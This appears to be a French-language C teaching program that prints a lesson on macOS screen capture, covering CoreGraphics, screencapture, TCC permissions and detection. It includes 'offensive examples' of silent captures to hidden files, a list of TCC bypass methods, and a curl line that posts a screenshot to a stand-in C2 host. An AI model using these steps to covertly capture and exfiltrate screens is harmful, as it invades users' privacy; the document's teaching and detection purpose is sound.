/*
 * OBJECTIF  : Comprendre la capture d'ecran sur macOS
 * PREREQUIS : Bases C, CoreGraphics, TCC, permissions
 * COMPILE   : clang -o example example.c -framework CoreGraphics
 *             -framework CoreFoundation -framework ImageIO
 *
 * Ce programme demontre les techniques de capture d'ecran
 * sur macOS : CGDisplayCreateImage, screencapture CLI,
 * permissions TCC, et detection.
 * Demonstration pedagogique.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

/*
 * Etape 1 : Architecture graphique macOS
 */
static void explain_graphics_stack(void) {
    printf("[*] Etape 1 : Architecture graphique macOS\n\n");

    printf("    ┌──────────────────────────────────────────┐\n");
    printf("    │  Application                              │\n");
    printf("    │  ┌──────────────────────────────────┐    │\n");
    printf("    │  │ AppKit / SwiftUI                   │    │\n");
    printf("    │  └──────────────┬───────────────────┘    │\n");
    printf("    │                 │                         │\n");
    printf("    │  ┌──────────────v───────────────────┐    │\n");
    printf("    │  │ CoreGraphics (Quartz 2D)          │    │\n");
    printf("    │  │ CGDisplayCreateImage()             │    │\n");
    printf("    │  │ CGWindowListCreateImage()          │    │\n");
    printf("    │  └──────────────┬───────────────────┘    │\n");
    printf("    │                 │                         │\n");
    printf("    │  ┌──────────────v───────────────────┐    │\n");
    printf("    │  │ WindowServer                       │    │\n");
    printf("    │  │ (compositeur d'affichage)          │    │\n");
    printf("    │  └──────────────┬───────────────────┘    │\n");
    printf("    │                 │                         │\n");
    printf("    │  ┌──────────────v───────────────────┐    │\n");
    printf("    │  │ Metal / GPU                        │    │\n");
    printf("    │  └──────────────────────────────────┘    │\n");
    printf("    └──────────────────────────────────────────┘\n\n");

    printf("    Permission TCC requise (macOS 10.15+) :\n");
    printf("    com.apple.private.tcc.allow.screenrecord\n");
    printf("    -> L'utilisateur doit autoriser manuellement\n\n");
}

/*
 * Etape 2 : Capture avec CoreGraphics (code reference)
 */
static void show_cg_capture_code(void) {
    printf("[*] Etape 2 : Capture avec CoreGraphics (reference)\n\n");

    printf("    #include <CoreGraphics/CoreGraphics.h>\n");
    printf("    #include <ImageIO/ImageIO.h>\n\n");

    printf("    Capturer l'ecran principal :\n");
    printf("    ───────────────────────────────────\n");
    printf("    CGDirectDisplayID display = CGMainDisplayID();\n");
    printf("    CGImageRef image = CGDisplayCreateImage(display);\n\n");
    printf("    if (image) {\n");
    printf("        // Sauver en PNG\n");
    printf("        CFURLRef url = CFURLCreateWithFileSystemPath(\n");
    printf("            NULL, CFSTR(\"/tmp/screen.png\"),\n");
    printf("            kCFURLPOSIXPathStyle, false);\n\n");
    printf("        CGImageDestinationRef dest =\n");
    printf("            CGImageDestinationCreateWithURL(\n");
    printf("                url, kUTTypePNG, 1, NULL);\n\n");
    printf("        CGImageDestinationAddImage(dest, image, NULL);\n");
    printf("        CGImageDestinationFinalize(dest);\n\n");
    printf("        CFRelease(dest);\n");
    printf("        CFRelease(url);\n");
    printf("        CGImageRelease(image);\n");
    printf("    }\n\n");

    printf("    Capturer une fenetre specifique :\n");
    printf("    ───────────────────────────────────\n");
    printf("    CGImageRef img = CGWindowListCreateImage(\n");
    printf("        CGRectNull,\n");
    printf("        kCGWindowListOptionIncludingWindow,\n");
    printf("        windowID,\n");
    printf("        kCGWindowImageDefault);\n\n");

    printf("    Lister les fenetres :\n");
    printf("    ───────────────────────────────────\n");
    printf("    CFArrayRef windows = CGWindowListCopyWindowInfo(\n");
    printf("        kCGWindowListOptionOnScreenOnly,\n");
    printf("        kCGNullWindowID);\n\n");
}

/*
 * Etape 3 : Capture via screencapture CLI
 */
static void demo_screencapture_cli(void) {
    printf("[*] Etape 3 : Commande screencapture\n\n");

    printf("    Syntaxe :\n");
    printf("    ───────────────────────────────────\n");
    printf("    screencapture [options] fichier.png\n\n");
    printf("    Options utiles :\n");
    printf("    -x          : pas de son de capture\n");
    printf("    -c          : copier dans le presse-papier\n");
    printf("    -T seconds  : delai avant capture\n");
    printf("    -t format   : png, jpg, pdf, tiff\n");
    printf("    -R x,y,w,h  : capturer une region\n");
    printf("    -l windowid : capturer une fenetre\n\n");

    printf("    Exemples offensifs :\n");
    printf("    ───────────────────────────────────\n");
    printf("    # Capture silencieuse\n");
    printf("    screencapture -x /tmp/.screen.png\n\n");
    printf("    # Capture compresse\n");
    printf("    screencapture -x -t jpg /tmp/.s.jpg\n\n");

    /* Verifier la disponibilite */
    printf("    Verification de screencapture :\n");
    struct stat st;
    if (stat("/usr/sbin/screencapture", &st) == 0) {
        printf("      /usr/sbin/screencapture : present\n");
    } else {
        printf("      screencapture : non trouve\n");
    }
    printf("\n");

    /* Lister les displays */
    printf("    Displays detectes :\n");
    FILE *fp = popen("system_profiler SPDisplaysDataType 2>/dev/null | "
                     "grep -E '(Display Type|Resolution|Vendor)' | head -6", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            line[strcspn(line, "\n")] = '\0';
            printf("      %s\n", line);
        }
        pclose(fp);
    }
    printf("\n");
}

/*
 * Etape 4 : Permission TCC pour Screen Recording
 */
static void explain_tcc_permission(void) {
    printf("[*] Etape 4 : Permission TCC Screen Recording\n\n");

    printf("    Depuis macOS 10.15 (Catalina) :\n");
    printf("    ───────────────────────────────────\n");
    printf("    - La capture d'ecran necessite TCC approval\n");
    printf("    - L'app doit etre dans :\n");
    printf("      Preferences > Securite > Screen Recording\n\n");

    printf("    Base TCC :\n");
    printf("    ───────────────────────────────────\n");
    printf("    ~/Library/Application Support/\n");
    printf("      com.apple.TCC/TCC.db\n");
    printf("    /Library/Application Support/\n");
    printf("      com.apple.TCC/TCC.db\n\n");

    printf("    Verifier les permissions :\n");
    printf("    ───────────────────────────────────\n");
    printf("    # Lister les apps avec Screen Recording\n");
    printf("    sqlite3 ~/Library/Application\\ Support/\n");
    printf("      com.apple.TCC/TCC.db \\\n");
    printf("      \"SELECT client FROM access \\\n");
    printf("       WHERE service='kTCCServiceScreenCapture'\"\n\n");

    /* Verifier la base TCC */
    printf("    Base TCC utilisateur :\n");
    const char *home = getenv("HOME");
    if (home) {
        char path[512];
        struct stat st;
        snprintf(path, sizeof(path),
                 "%s/Library/Application Support/com.apple.TCC/TCC.db", home);
        if (stat(path, &st) == 0) {
            printf("      TCC.db : present (%lld octets)\n", (long long)st.st_size);
        } else {
            printf("      TCC.db : non accessible\n");
        }
    }
    printf("\n");

    printf("    Contournements historiques TCC :\n");
    printf("    - Injection dans une app autorisee\n");
    printf("    - Modification de TCC.db (avant SIP)\n");
    printf("    - Abus de FDA (Full Disk Access)\n");
    printf("    - CVE-2020-9839, CVE-2021-30713...\n\n");
}

/*
 * Etape 5 : Exfiltration
 */
static void explain_exfiltration(void) {
    printf("[*] Etape 5 : Exfiltration des captures\n\n");

    printf("    Methodes d'exfiltration :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. HTTP POST (NSURLSession/curl)\n");
    printf("       curl -X POST -F 'file=@/tmp/s.png' C2\n\n");

    printf("    2. DNS exfiltration (petites images)\n");
    printf("       -> Encoder en base64 + split en labels\n\n");

    printf("    3. iCloud/Dropbox API\n");
    printf("       -> Upload via l'API cloud\n\n");

    printf("    4. Clipboard monitoring\n");
    printf("       -> Capturer le presse-papier regulierement\n\n");

    printf("    Reduire la taille :\n");
    printf("    ───────────────────────────────────\n");
    printf("    - Format JPEG (compression lossy)\n");
    printf("    - Reduire la resolution\n");
    printf("    - Capturer une region specifique\n");
    printf("    - Niveau de qualite bas\n\n");
}

/*
 * Etape 6 : Detection et protection
 */
static void explain_detection(void) {
    printf("[*] Etape 6 : Detection et protection\n\n");

    printf("    Detection :\n");
    printf("    ───────────────────────────────────\n");
    printf("    - Surveiller les appels CGDisplayCreateImage\n");
    printf("    - Monitorer l'execution de screencapture\n");
    printf("    - Verifier les permissions TCC\n");
    printf("    - Endpoint Security (file creation events)\n\n");

    printf("    Commandes :\n");
    printf("    ───────────────────────────────────\n");
    printf("    # Voir les permissions screen recording\n");
    printf("    tccutil reset ScreenCapture  # reset perms\n\n");
    printf("    # Monitorer les captures de fichier\n");
    printf("    sudo eslogger create | grep -i screen\n\n");

    printf("    Protection :\n");
    printf("    - Garder TCC actif et restrictif\n");
    printf("    - Auditer les apps avec Screen Recording\n");
    printf("    - Oversight (Objective-See) pour alertes\n");
    printf("    - Ne pas donner FDA inutilement\n\n");
}

int main(void) {
    printf("[*] Demo : Screenshot macOS\n\n");

    explain_graphics_stack();
    show_cg_capture_code();
    demo_screencapture_cli();
    explain_tcc_permission();
    explain_exfiltration();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
